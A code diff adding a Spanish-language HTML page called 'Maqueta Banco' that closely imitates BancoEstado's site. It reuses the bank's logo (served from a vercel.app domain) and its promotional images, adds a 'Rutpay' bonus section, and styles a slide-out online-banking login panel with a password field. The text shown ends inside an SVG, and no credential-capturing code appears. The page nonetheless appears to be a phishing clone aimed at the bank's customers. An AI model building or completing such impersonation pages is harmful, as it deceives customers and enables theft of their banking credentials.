@@ -1,0 +1,1713 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maqueta Banco</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background: #f5f5f5;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background: linear-gradient(90deg, #ff8800, #ff3b1f);
+            height: 63px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .logo img {
+            height: 40px;
+            width: auto;
+            display: block;
+        }
+
+        .logo .texto {
+            font-size: 34px;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        .logo .texto span {
+            font-size: 13px;
+            display: block;
+            font-weight: normal;
+        }
+
+        .login {
+            background: white;
+            color: #b53d3d;
+            padding: 14px 25px;
+            border-radius: 40px;
+            font-weight: bold;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, .25);
+            cursor: pointer;
+            transition: transform 0.2s;
+            white-space: nowrap;
+        }
+
+        .login:hover {
+            transform: scale(1.05);
+        }
+
+        .menu {
+            color: white;
+            font-size: 25px;
+            cursor: pointer;
+        }
+
+        /* --- SLIDER / HERO --- */
+        .slider-container {
+            position: relative;
+            height: 420px;
+            overflow: hidden;
+        }
+
+        .slides {
+            display: flex;
+            transition: transform 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            height: 100%;
+            will-change: transform;
+        }
+
+        .slide {
+            min-width: 100%;
+            height: 100%;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .overlay {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to top, rgba(0, 0, 0, .7), transparent);
+        }
+
+        .hero-text {
+            position: absolute;
+            bottom: 35px;
+            width: 100%;
+            text-align: center;
+            color: white;
+            z-index: 2;
+        }
+
+        .hero-text h1 {
+            font-size: 60px;
+            font-weight: bold;
+        }
+
+        .hero-text p {
+            margin-top: 10px;
+            font-size: 24px;
+        }
+
+        /* --- CONTROLES DEL SLIDER --- */
+        .slider-controls {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            transform: translateY(-50%);
+            padding: 0 16px;
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .slider-controls button {
+            background: rgba(255, 255, 255, 0.8);
+            border: none;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            font-size: 28px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            pointer-events: all;
+            transition: background 0.2s, transform 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #1a1a1a;
+        }
+
+        .slider-controls button:hover {
+            background: #fff;
+            transform: scale(1.05);
+        }
+
+        /* --- INDICADORES (DOTS) --- */
+        .slider-dots {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            padding: 16px 0 20px;
+            background: linear-gradient(90deg, #ff8800, #ff3b1f);
+        }
+
+        .slider-dots .dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #ccc;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s, transform 0.3s;
+        }
+
+        .slider-dots .dot.active {
+            background: #ff8800;
+            transform: scale(1.3);
+        }
+
+        /* --- TARJETAS (imagen real de BancoEstado) --- */
+        .cards {
+            width: 90%;
+            margin: auto;
+            margin-top: -40px;
+            position: relative;
+            z-index: 5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .cards img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            transform: rotate(-2deg);
+            transition: transform 0.3s ease;
+        }
+
+        .cards img:hover {
+            transform: rotate(0deg) scale(1.02);
+        }
+
+        .cards .btn-solicita {
+            background: #ff8800;
+            color: white;
+            padding: 14px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 22px;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(255, 136, 0, 0.4);
+            transition: background 0.3s, transform 0.3s;
+            display: inline-block;
+            margin-top: 5px;
+        }
+
+        .cards .btn-solicita:hover {
+            background: #e67700;
+            transform: scale(1.05);
+        }
+
+        /* --- SECCIÓN INFO PRINCIPAL (Rutpay) --- */
+        .info {
+            background: white;
+            margin-top: 40px;
+            padding: 40px 25px;
+            text-align: center;
+        }
+
+        .info .imagen-anuncio {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            border-radius: 16px;
+            margin: 25px 0;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            display: block;
+            object-fit: contain;
+        }
+
+        .info h2 {
+            font-size: 50px;
+            color: #222;
+            line-height: 1.3;
+        }
+
+        .info h2 .rutpay {
+            color: #ff8800;
+        }
+
+        .info h2 .bono-verde {
+            display: block;
+            font-size: 38px;
+            color: #2e7d32;
+            margin-top: 10px;
+        }
+
+        .info h2 .monto {
+            font-size: 42px;
+            color: #ff3b1f;
+            display: block;
+            margin: 5px 0;
+        }
+
+        .info h2 .hijos {
+            font-size: 20px;
+            color: #333;
+            display: block;
+        }
+
+        .info .subtitle {
+            margin-top: 15px;
+            font-size: 22px;
+            color: #333;
+        }
+
+        .info .highlight {
+            font-weight: bold;
+            color: #0059b8;
+            font-size: 26px;
+        }
+
+        .info p {
+            margin-top: 20px;
+            font-size: 28px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .info .small-text {
+            font-size: 18px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .btn {
+            display: inline-block;
+            margin-top: 40px;
+            background: #0059b8;
+            color: white;
+            padding: 20px 60px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .btn-rutpay {
+            background: #ff8800;
+        }
+
+        .btn-rutpay:hover {
+            background: #e67700;
+        }
+
+        /* --- SECCIÓN BIENEFICIOS (movida más abajo) --- */
+        .bieneficios-section {
+            background: white;
+            margin-top: 40px;
+            padding: 40px 25px;
+            text-align: center;
+            border-top: 3px solid #ff8800;
+        }
+
+        .bieneficios-section h2 {
+            font-size: 50px;
+            color: #222;
+            line-height: 1.3;
+        }
+
+        .bieneficios-section h2 strong {
+            display: block;
+        }
+
+        .bieneficios-section p {
+            margin-top: 20px;
+            font-size: 28px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        .bieneficios-section .btn {
+            background: #0059b8;
+        }
+
+        /* --- BENEFICIO --- */
+        .beneficio {
+            width: 90%;
+            margin: 40px auto;
+            display: flex;
+            border-radius: 15px;
+            overflow: hidden;
+            background: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, .1);
+        }
+
+        .icono {
+            width: 90px;
+            background: #ff9800;
+        }
+
+        .texto {
+            padding: 25px;
+        }
+
+        .texto h3 {
+            font-size: 28px;
+        }
+
+        /* ===== PANEL LATERAL (Modal) ===== */
+        .modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .45);
+            display: flex;
+            justify-content: flex-end;
+            visibility: hidden;
+            opacity: 0;
+            transition: .3s;
+            z-index: 999;
+        }
+
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .panel {
+            width: 420px;
+            max-width: 100%;
+            height: 100%;
+            background: #f4f4f4;
+            transform: translateX(100%);
+            transition: .35s;
+            overflow: auto;
+        }
+
+        .modal.active .panel {
+            transform: translateX(0);
+        }
+
+        .top-app {
+            background: #4054c8;
+            color: white;
+            padding: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .top-app .logo-mini {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .top-app .logo-mini img {
+            height: 30px;
+            width: auto;
+            display: block;
+        }
+
+        .top-app .logo-mini .texto-mini {
+            font-size: 14px;
+            line-height: 1.2;
+        }
+
+        .top-app .logo-mini .texto-mini strong {
+            display: block;
+            font-size: 16px;
+        }
+
+        .irapp {
+            background: white;
+            color: #4054c8;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        .irapp:hover {
+            transform: scale(1.05);
+        }
+
+        .panel-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background: #f4f4f4;
+        }
+
+        .panel-header .logo-panel {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .panel-header .logo-panel svg {
+            height: 50px;
+            width: auto;
+            display: block;
+            transform: scale(1.1);
+        }
+
+        .panel-header .logo-panel .nombre-panel {
+            font-size: 22px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .cerrar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            background: #e8e8ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 26px;
+            transition: background 0.2s, transform 0.2s;
+        }
+
+        .cerrar:hover {
+            background: #d5d5ff;
+            transform: rotate(90deg);
+        }
+
+        .card-login {
+            background: white;
+            margin:20px;
+            border-radius: 6px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, .15);
+            width: 322px;
+        }
+
+        .card-login h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 22px;
+            color: #333;
+        }
+
+        .card-login label {
+            display: block;
+            font-weight: bold;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .card-login input {
+            width: 91%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #bbb;
+            border-radius: 3px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .card-login input:focus {
+            border-color: #4054c8;
+            outline: none;
+        }
+
+        .btn-login {
+            width: 94%;
+            margin-top: 30px;
+            background: #4352c3;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            padding: 8px;
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+
+        .btn-login:hover {
+            background: #3444a8;
+        }
+
+        .link {
+            text-align: center;
+            color: #4352c3;
+            margin: 30px 0;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .linea {
+            height: 1px;
+            background: #ddd;
+            margin: 25px 0;
+        }
+
+        .btn-empresa {
+            border: 3px solid #4352c3;
+            color: #4352c3;
+            padding: 8px;
+            border-radius: 40px;
+            text-align: center;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s;
+            width: 90%;
+        }
+
+        .btn-empresa:hover {
+            background: #4352c3;
+            color: white;
+        }
+
+        /* --- AYUDA DENTRO DEL CARD --- */
+        .ayuda-footer {
+            text-align: center;
+            padding: 20px 10px 5px 10px;
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+            width: 90%;
+            margin: 0 auto;
+        }
+
+        .ayuda-footer strong {
+            color: #4352c3;
+            cursor: pointer;
+        }
+
+        .ayuda-footer strong:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilo para el contenedor de la clave con el ojo */
+        .password-container {
+            position: relative;
+            width: 91%;
+            margin-top: 10px;
+        }
+
+        .password-container input {
+            width: 100%;
+            padding: 8px;
+            padding-right: 40px;
+            border: 1px solid #bbb;
+            border-radius: 3px;
+            font-size: 18px;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        .password-container input:focus {
+            border-color: #4054c8;
+            outline: none;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 0;
+            line-height: 1;
+            color: #444;
+            transition: color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .toggle-password:hover {
+            color: #000;
+        }
+
+        .toggle-password svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+        }
+
+        /* --- FOOTER --- */
+        .footer {
+            background: #0a2a44;
+            color: white;
+            padding: 40px 20px 20px;
+            margin-top: 40px;
+            border-top: 5px solid #ff8800;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 30px;
+        }
+
+        .footer-logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .footer-logo img {
+            height: 48px;
+            width: auto;
+        }
+
+        .footer-logo .footer-logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            line-height: 1;
+        }
+
+        .footer-logo .footer-logo-text span {
+            font-size: 14px;
+            font-weight: normal;
+            display: block;
+            color: #ccc;
+        }
+
+        .footer-mission {
+            margin-top: 15px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #ccc;
+            max-width: 500px;
+        }
+
+        .footer-address {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #aaa;
+        }
+
+        .footer-divider {
+            border: none;
+            border-top: 1px solid #1a3a5a;
+            margin: 20px 0;
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: flex-start;
+            gap: 20px;
+        }
+
+        .footer-siguenos {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .footer-siguenos h4 {
+            font-size: 14px;
+            font-weight: bold;
+            color: #ff8800;
+            margin-bottom: 5px;
+        }
+
+        .footer-siguenos .social-icons {
+            display: flex;
+            gap: 12px;
+        }
+
+        .footer-siguenos .social-icons a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 20px;
+            transition: color 0.2s;
+        }
+
+        .footer-siguenos .social-icons a:hover {
+            color: #ff8800;
+        }
+
+        .footer-sitios {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px 25px;
+        }
+
+        .footer-sitios a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-sitios a:hover {
+            color: #ff8800;
+        }
+
+        .footer-app {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            gap: 8px;
+        }
+
+        .footer-app p {
+            font-size: 13px;
+            color: #ccc;
+        }
+
+        .footer-app .btn-app {
+            background: #ff8800;
+            color: white;
+            padding: 10px 25px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 14px;
+            transition: background 0.2s, transform 0.2s;
+            display: inline-block;
+        }
+
+        .footer-app .btn-app:hover {
+            background: #e67700;
+            transform: scale(1.03);
+        }
+
+        .footer-copyright {
+            margin-top: 25px;
+            padding-top: 15px;
+            border-top: 1px solid #1a3a5a;
+            font-size: 12px;
+            color: #777;
+            text-align: center;
+        }
+
+        /* --- RESPONSIVE --- */
+        @media(max-width: 700px) {
+            .logo .texto {
+                font-size: 26px;
+            }
+            .logo img {
+                height: 32px;
+            }
+            .login {
+                font-size: 14px;
+                padding: 10px 18px;
+            }
+            .slider-container {
+                height: 300px;
+            }
+            .hero-text h1 {
+                font-size: 38px;
+            }
+            .hero-text p {
+                font-size: 18px;
+            }
+            .cards {
+                margin-top: -30px;
+            }
+            .cards img {
+                max-width: 90%;
+            }
+            .cards .btn-solicita {
+                font-size: 18px;
+                padding: 12px 30px;
+            }
+            .info {
+                padding: 25px 15px;
+            }
+            .info h2 {
+                font-size: 28px;
+            }
+            .info h2 .bono-verde {
+                font-size: 26px;
+            }
+            .info h2 .monto {
+                font-size: 32px;
+            }
+            .info p {
+                font-size: 18px;
+            }
+            .info .subtitle {
+                font-size: 18px;
+            }
+            .info .highlight {
+                font-size: 20px;
+            }
+            .info .small-text {
+                font-size: 15px;
+            }
+            .info .imagen-anuncio {
+                margin: 20px 0;
+                border-radius: 12px;
+            }
+            .bieneficios-section h2 {
+                font-size: 28px;
+            }
+            .bieneficios-section p {
+                font-size: 18px;
+            }
+            .btn {
+                font-size: 20px;
+                padding: 15px 35px;
+            }
+            .slider-controls button {
+                width: 36px;
+                height: 36px;
+                font-size: 20px;
+            }
+            .panel {
+                width: 96%;
+            }
+            .panel-header .logo-panel .nombre-panel {
+                font-size: 18px;
+            }
+            .panel-header .logo-panel svg {
+                height: 40px;
+                transform: scale(1);
+            }
+            .top-app .logo-mini img {
+                height: 24px;
+            }
+            .top-app .logo-mini .texto-mini {
+                font-size: 12px;
+            }
+            .top-app .logo-mini .texto-mini strong {
+                font-size: 14px;
+            }
+            .card-login {
+                width: 103%;
+            }
+            .footer-bottom {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .footer-sitios {
+                gap: 8px 15px;
+            }
+            .footer-app {
+                width: 100%;
+            }
+            .footer-app .btn-app {
+                width: 100%;
+                text-align: center;
+            }
+        }
+
+        @media(max-width: 480px) {
+            .logo .texto {
+                font-size: 20px;
+            }
+            .logo img {
+                height: 26px;
+            }
+            .logo .texto span {
+                font-size: 10px;
+            }
+            .slider-container {
+                height: 220px;
+            }
+            .hero-text h1 {
+                font-size: 28px;
+            }
+            .hero-text p {
+                font-size: 14px;
+            }
+            .cards {
+                margin-top: 8px;
+            }
+            .cards img {
+                max-width: 95%;
+            }
+            .cards .btn-solicita {
+                font-size: 16px;
+                padding: 10px 25px;
+            }
+            .info {
+                padding: 20px 12px;
+            }
+            .info h2 {
+                font-size: 22px;
+            }
+            .info h2 .bono-verde {
+                font-size: 20px;
+            }
+            .info h2 .monto {
+                font-size: 26px;
+            }
+            .info p {
+                font-size: 15px;
+            }
+            .info .subtitle {
+                font-size: 15px;
+            }
+            .info .highlight {
+                font-size: 17px;
+            }
+            .info .imagen-anuncio {
+                margin: 15px 0;
+                border-radius: 10px;
+            }
+            .bieneficios-section h2 {
+                font-size: 22px;
+            }
+            .bieneficios-section p {
+                font-size: 15px;
+            }
+            .slider-controls button {
+                width: 30px;
+                height: 30px;
+                font-size: 16px;
+            }
+            .panel-header {
+                padding: 15px;
+            }
+            .panel-header .logo-panel .nombre-panel {
+                font-size: 16px;
+            }
+            .panel-header .logo-panel svg {
+                height: 32px;
+                transform: scale(1);
+            }
+            .cerrar {
+                width: 38px;
+                height: 38px;
+                font-size: 22px;
+            }
+            .card-login {
+                padding: 20px;
+                margin: 15px;
+                width: 93%;
+            }
+            .card-login h2 {
+                font-size: 18px;
+            }
+            .btn-login {
+                font-size: 13px;
+                padding: 11px;
+            }
+            .top-app .logo-mini img {
+                height: 20px;
+            }
+            .top-app .logo-mini .texto-mini {
+                font-size: 11px;
+            }
+            .top-app .logo-mini .texto-mini strong {
+                font-size: 12px;
+            }
+            .ayuda-footer {
+                font-size: 12px;
+                padding: 15px 5px 0 5px;
+            }
+            .toggle-password svg {
+                width: 18px;
+                height: 18px;
+            }
+            .footer-logo .footer-logo-text {
+                font-size: 20px;
+            }
+            .footer-logo img {
+                height: 36px;
+            }
+            .footer-sitios {
+                flex-direction: column;
+                gap: 6px;
+            }
+        }
+    </style>
+
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header>
+        <div class="logo">
+            <img src="https://bancoestado-rutpay.vercel.app/logo-bancoestado.svg" alt="BancoEstado">
+        </div>
+        <div class="login" onclick="abrirPanel()">
+            Banca en Línea
+        </div>
+        <div class="menu">
+            ☰
+        </div>
+    </header>
+
+    <!-- SLIDER / HERO -->
+    <div class="slider-container">
+        <div class="slides" id="slides">
+            <!-- Slide 1: Ticket Total -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--fef6faf3-8e39-45f2-a964-1a1c5483c56f/ticket-total-720x450.jpg?quality=82&preferwebp=true" alt="Ticket Total" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Ticket Total</h1>
+                    <p>El único concurso que te lleva a todos los conciertos</p>
+                </div>
+            </div>
+            <!-- Slide 2: Rutpay Fasa -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--bd887565-925a-4f78-b585-2420f07f2f34/rutpay-fasa-viernes-720x450.jpg?quality=82&preferwebp=true" alt="Rutpay Fasa" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Rutpay</h1>
+                    <p>40% dto. en medicamentos, vitaminas y dermocosmética</p>
+                </div>
+            </div>
+            <!-- Slide 3: Distribuidores Gas -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--28bcd628-db66-4dc7-bd70-cadbbefbe426/distribuidores-gas-720x450.jpg?quality=82&preferwebp=true" alt="Distribuidores Gas" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Cupón de Gas</h1>
+                    <p>Conoce cómo recibir los pagos del Cupón de Gas Licuado</p>
+                </div>
+            </div>
+            <!-- Slide 4: Medidas de Apoyo -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--f60fcc4a-d5a1-45b8-8b40-aa6f74968e2b/medidas-de-apoyo-720x450.jpg?quality=82&preferwebp=true" alt="Medidas de Apoyo" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Medidas de Apoyo</h1>
+                    <p>Chile no se detiene, nuestro banco tampoco</p>
+                </div>
+            </div>
+            <!-- Slide 5: Bieneficios Verano -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--2d05fb69-eb82-4547-a525-3a6a23f95d4b/bieneficios-verano-720x450.png?quality=82&preferwebp=true" alt="Bieneficios Verano" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Bieeeeneficios</h1>
+                    <p>para cuidar tu salud</p>
+                </div>
+            </div>
+            <!-- Slide 6: Hipotecario PRO -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--d9232bfb-9480-4ac3-a91c-0d79273c90a8/hipotecario-720x450.jpg?quality=82&preferwebp=true" alt="Hipotecario PRO" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Hipotecario PRO</h1>
+                    <p>Con una tasa PRO rebajada</p>
+                </div>
+            </div>
+            <!-- Slide 7: Beneficio Gas -->
+            <div class="slide">
+                <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--801cb1c5-e6bc-4dc2-b750-4422b1d1284a/beneficio-gas-720x450.jpg?quality=82&preferwebp=true" alt="Beneficio Gas" loading="lazy">
+                <div class="overlay"></div>
+                <div class="hero-text">
+                    <h1>Cupón de Gas</h1>
+                    <p>Conoce más del Cupón de Gas Licuado de $27.000</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Controles -->
+        <div class="slider-controls">
+            <button id="prevBtn" aria-label="Anterior">‹</button>
+            <button id="nextBtn" aria-label="Siguiente">›</button>
+        </div>
+    </div>
+
+    <!-- Indicadores (Dots) -->
+    <div class="slider-dots" id="dotsContainer"></div>
+
+    <!-- TARJETAS (imagen real de BancoEstado + botón Solicita ya) -->
+    <div class="cards">
+        <img src="https://www.bancoestado.cl/adobe/dynamicmedia/deliver/dm-aid--40931a6e-12be-4d56-ae45-25bbc13d6383/tarjetas-bancoestado-pack-visa-2.png?quality=82&preferwebp=true" alt="Tarjetas BancoEstado">
+        <a href="#" class="btn-solicita">📱 Solicita ya</a>
+    </div>
+
+    <!-- SECCIÓN INFO PRINCIPAL (Rutpay) -->
+    <section class="info">
+        <h2>
+            <span class="rutpay">Rutpay</span>
+             <svg role="img" alt="" aria-hidden="true" focusable="false" xmlns="http://www.w3.org/2000/svg" width="158" height="32" viewBox="0 0 158 32" fill="none">
+                        <path fill="#fff" d="M31.71 0H0v31.79h31.71V0Z"></path>
+                        <path fill="#343E46" d="M53.38 24.27a8.47 8.47 0 0 0 2.31-.34l.44-2.35a5.89 5.89 0 0 0-2.41-.44c-1.28 0-2.24.44-2.43 1.47-.19 1.03.48 1.66 2.09 1.66Zm5.54-5-1.1 6a13.73 13.73 0 0 1-5.26 1.09c-3.24 0-4.58-1.37-4.18-3.56.4-2.19 2.61-3.49 5.26-3.47a7.211 7.211 0 0 1 2.63.42l.12-.62c.24-1.32-.49-2.11-2.25-2.11a6.21 6.21 0 0 0-3.23 1 1.75 1.75 0 0 1-.89-1.68 8 8 0 0 1 4.72-1.55c2.89 0 4.78 1.29 4.18 4.53M127.48 24.27a8.55 8.55 0 0 0 2.32-.34l.42-2.36a5.85 5.85 0 0 0-2.4-.44c-1.29 0-2.24.44-2.44 1.47-.2 1.03.48 1.66 2.09 1.66m5.55-5-1.11 6a13.728 13.728 0 0 1-5.26 1.09c-3.23 0-4.58-1.37-4.17-3.56.41-2.19 2.61-3.49 5.26-3.47a7.25 7.25 0 0 1 2.63.42l.11-.62c.24-1.32-.49-2.11-2.24-2.11a6.251 6.251 0 0 0-3.24 1 1.772 1.772 0 0 1-.89-1.68 8.052 8.052 0 0 1 4.72-1.55c2.89 0 4.78 1.29 4.19 4.53M71.58 20.57a7 7 0 0 1 6.87-5.85 4.92 4.92 0 0 1 3.47 1.25 4.1 4.1 0 0 1-1.75 1.87 2.87 2.87 0 0 0-2.11-.85 4 4 0 0 0-3.82 3.56c-.35 1.87.34 3.53 2.53 3.53a4.08 4.08 0 0 0 2.6-.92 2.2 2.2 0 0 1 1.06 1.78 6.73 6.73 0 0 1-4.1 1.41c-3.48 0-5.43-2.13-4.75-5.78Z"></path>
+                        <path fill="#343E46" d="M90.14 20.51c.38-2.1-.55-3.56-2.51-3.56a4 4 0 0 0-3.83 3.56c-.38 2.08.56 3.51 2.52 3.51a3.93 3.93 0 0 0 3.82-3.51Zm-9 0a7.07 7.07 0 0 1 6.92-5.83c3.37 0 5.31 2.41 4.68 5.83a7.05 7.05 0 0 1-6.91 5.8c-3.38 0-5.32-2.38-4.69-5.8ZM103.8 24.95a3.791 3.791 0 0 1 1.54-1.81 4.45 4.45 0 0 0 3.17 1.09c1.55 0 2.21-.58 2.35-1.32.14-.74-.41-1.15-2.32-1.45-1.91-.3-3.6-1-3.18-3.33.38-2 2.46-3.42 5.23-3.42a6.33 6.33 0 0 1 3.92 1.06 3.55 3.55 0 0 1-1.34 1.87 5.691 5.691 0 0 0-3.06-.83c-1.39 0-2.07.44-2.2 1.13-.13.69.29 1.07 2.11 1.37 2.31.37 3.9 1.18 3.49 3.35-.41 2.17-2.43 3.67-5.43 3.67a5.929 5.929 0 0 1-4.28-1.38ZM154.67 20.51c.39-2.1-.55-3.56-2.51-3.56a3.999 3.999 0 0 0-3.82 3.56c-.39 2.08.55 3.51 2.52 3.51a3.919 3.919 0 0 0 3.81-3.51Zm-9 0a7.071 7.071 0 0 1 6.92-5.83c3.38 0 5.31 2.41 4.68 5.83a7.046 7.046 0 0 1-6.91 5.8c-3.37 0-5.32-2.38-4.69-5.8ZM141.35 23.67a6.119 6.119 0 0 1-2.23.35c-2 0-3.1-1.34-2.71-3.49a4.118 4.118 0 0 1 4-3.49 3.39 3.39 0 0 1 2 .49l-1.06 6.14Zm2.19-11.84-.6 3.25a5.56 5.56 0 0 0-2.16-.35 7.101 7.101 0 0 0-7 5.85c-.69 3.69 1.39 5.73 5 5.73a12.24 12.24 0 0 0 4.94-1.09l2.61-14.15-2.79.76ZM123.11 15.17h-4.09l.53-2.85-2.73.76-1.75 9.51c-.49 2.63 1.05 3.69 3.41 3.69a5.93 5.93 0 0 0 3.49-1.17 2.209 2.209 0 0 0-.77-1.83 3.399 3.399 0 0 1-2 .74c-1.09 0-1.77-.42-1.47-2l.86-4.7h4.09c.149-.346.256-.709.32-1.08.065-.33.089-.665.07-1M105.47 11.13H95.04l.53 1.68c.01.086.01.174 0 .26v.13l-2.35 12.76h9.71a4.54 4.54 0 0 0 .38-1.22c.076-.375.093-.76.05-1.14h-7.09l.75-4.06h6.12c.157-.381.277-.776.36-1.18.073-.389.097-.785.07-1.18h-6.12l.68-3.67h6.88c.162-.38.283-.775.36-1.18.076-.395.103-.798.08-1.2M66.51 14.68a9.741 9.741 0 0 0-2.94.47.78.78 0 0 1-.22 0 .59.59 0 0 1-.23 0l-1.84-.55-.33 1.81-1.76 9.54c.421.084.85.124 1.28.12a6.58 6.58 0 0 0 1.33-.12l1.53-8.27a5.72 5.72 0 0 1 2.54-.6c1.68 0 2.51.76 2.14 2.77l-1.12 6.1c.425.084.857.124 1.29.12.45.003.898-.037 1.34-.12l1.24-6.72c.46-2.52-.71-4.56-4.24-4.56M45.69 15.12c-.25 1.39-1.16 2.17-3.1 2.17H40.3l.76-4.08c.73-.07 1.42-.1 2.09-.1 1.92 0 2.78.74 2.54 2m-.63 6.59c-.31 1.66-1.46 2.4-3.91 2.4a17.65 17.65 0 0 1-2.08-.11l.83-4.51h2.49c2 0 2.94.74 2.67 2.22Zm3.19-6.66c.48-2.61-1-4.08-4.86-4.08h-5.57l.6 1.79a.871.871 0 0 1 0 .28c.005.063.005.127 0 .19l-2.35 12.74c1.5.273 3.025.397 4.55.37 4.18 0 6.51-1.74 7-4.55a2.79 2.79 0 0 0-1.89-3.52 4.08 4.08 0 0 0 2.46-3.19"></path>
+                        <path fill="#FF2318" d="m.79 16.04 10.76-4.67V7.91a14.24 14.24 0 0 0 8.65-4.83l10.76 8.79v-11H.79v15.17Z"></path>
